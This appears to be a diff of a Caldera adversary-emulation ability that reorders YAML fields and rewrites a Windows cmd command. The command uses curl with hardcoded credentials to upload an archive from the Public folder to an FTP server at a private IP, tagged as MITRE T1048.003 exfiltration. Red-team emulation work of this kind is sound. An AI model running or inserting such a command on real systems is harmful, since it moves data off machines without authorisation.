@@ -1,29 +1,34 @@
-- name: Exfiltrates data using curl and ftp
-  description: this ability send data to Caldera's FTP using curl command
-  tactic: exfiltration
-  technique_id: T1048.003
-  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
-  executors:
-  - payloads: []
+- executors:
+  - cleanup: []
     platform: windows
+    language: null
+    variations: []
     name: cmd
-    cleanup: []
+    payloads: []
+    additional_info: {}
+    build_target: null
     parsers: []
-    timeout: '180'
-    command: 'SET "Username = caldera_user";
-      SET "Password = caldera";
-      SET "Ftp = ftp://192.168.0.149";
-      SET "FtpPort = 2222";
-      SET "ArchiveName = data.zip";
-      SET "LocalStorageDir = exf";
-      SET "WholePathArchive = %PUBLIC%/%LocalStorageDir%/%ArchiveName%";
-      curl -T %WholePathArchive% -u "%Username%:%Password%" %Ftp%:%FtpPort%;'
-  repeatable: false
-  additional_info: {}
-  privilege: ''
-  singleton: true
-  buckets: []
-  requirements: []
+    command: 'SET Username=caldera_user && SET Password=caldera && SET Ftp=ftp://192.168.0.149
+      && SET FtpPort=2222 && SET ArchiveName=data.zip && SET LocalStorageDir=exf &&
+      SET WholePathArchive=%PUBLIC%\exf\data.zip && curl -T c:\Users\Public\exf\data.zip
+      -u "caldera_user:caldera" ftp://192.168.0.149:2222
+      '
+    timeout: 180
+    code: null
+    uploads: []
+  plugin: ''
   access: {}
-  cleanup: []
+  tactic: exfiltration
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  singleton: true
+  requirements: []
+  repeatable: false
+  privilege: ''
+  delete_payload: false
+  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+  technique_id: T1048.003
+  name: Exfiltrates data using curl and ftp (2)
+  description: this ability send data to Caldera's FTP using curl command
   id: curl_ftp_exfiltration_to_caldera_ftp_server
